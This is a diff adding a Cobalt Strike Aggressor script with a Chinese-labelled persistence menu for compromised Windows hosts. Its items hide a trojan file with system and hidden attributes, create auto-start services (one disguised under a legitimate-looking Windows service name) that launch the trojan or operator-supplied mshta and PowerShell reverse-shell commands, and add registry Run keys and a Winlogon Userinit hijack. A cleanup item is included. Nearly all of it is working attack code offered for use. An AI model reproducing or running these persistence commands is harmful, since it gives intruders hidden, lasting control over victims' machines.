@@ -1,0 +1,106 @@
+    menu "权限维持" {
+    item "设置木马路径" {
+		blog($1, "\c9=========== 设置木马路径 ==========")
+        local('$bid');
+        foreach $bid ($1){
+            prompt_text("filePath", $filePath, {
+                $filePath = $1;
+                return $filePath;
+            });
+        }
+    }
+    item "隐藏木马文件" {
+		blog($1, "\c9=========== 隐藏木马文件 ==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" +s +h");
+        }
+	}
+	item "设置mshta反弹命令" {
+		blog($1, "\c9=========== 设置mshta反弹命令 ==========")
+		local('$bid');
+		foreach $bid ($1){
+            prompt_text("filePath3", $filePath3, {
+                $filePath3 = $1;
+                return $filePath3;
+            });
+        }
+    }
+	item "设置PowerShell反弹命令" {
+		blog($1, "\c9=========== 设置PowerShell反弹命令 ==========")
+		local('$bid');
+		foreach $bid ($1){
+            prompt_text("Powershell (use \\ before \")", $filePath2, {
+                $filePath2 = $1;
+                return $filePath2;
+            });
+        }
+    }
+    item "服务自启[文件]"{
+		blog($1, "\c9=========== 服务自启[文件]==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"Bobo\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"Bobo\" start= auto&&net start Bobo");
+
+        }
+        }
+    item "服务自启[mshta]"{
+		blog($1, "\c9=========== 服务自启[mshta] ==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"Bobo2\" binpath= \"cmd /c $filePath3\"&&sc config \"Bobo2\" start= auto&&net start Bobo2");
+        }
+        }
+    item "服务自启[PowerShell]"{
+		blog($1, "\c9=========== 服务自启[PowerShell] ==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"CDPUserSvc_35863\" binpath= \"cmd /c $filePath2\"&&sc config \"CDPUserSvc_35863\" start= auto&&net start CDPUserSvc_35863");
+        }
+        }
+    item "注册表自启[RegHKLM PowerShell]"{
+		blog($1, "\c9=========== 注册表自启[RegHKLM PowerShell]==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKLM /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+        }
+	}
+    item "注册表自启[RegHKCU PowerShell]"{
+		blog($1, "\c9=========== 注册表自启[RegHKCU PowerShell]==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKCU /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+        }
+	}
+    item "注册表自启[mshta]"{
+		blog($1, "\c9=========== 注册表自启[mshta] ==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\$filePath3\" /f");
+        }
+	}
+	item "注册表自启[文件]"{
+		blog($1, "\c9=========== 注册表自启[文件] ==========")
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Bobo /t REG_SZ /d \"$filePath\" /f");
+		bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v BoboE /t REG_SZ /d \"$filePath\" /f");
+		}
+	}
+
+	item "清除所有设置" {
+		blog($1, "\c9=========== 清除所有设置 ==========")
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" -s -h");
+            bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Bobo /f");
+	    bshell($1, "reg delete HKEY_CURRENT_USER\\Environment /v BoboE /f");
+            bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKLM /f");
+	    bshell($1, "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKCU /f");
+            bshell($1, "sc delete \"Bobo\"");
+	    bshell($1, "sc delete \"CDPUserSvc_35863\"");
+	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,\" /f");
+	    bshell($1, "sc delete \"Bobo2\"");
+        }
+        }
+        }
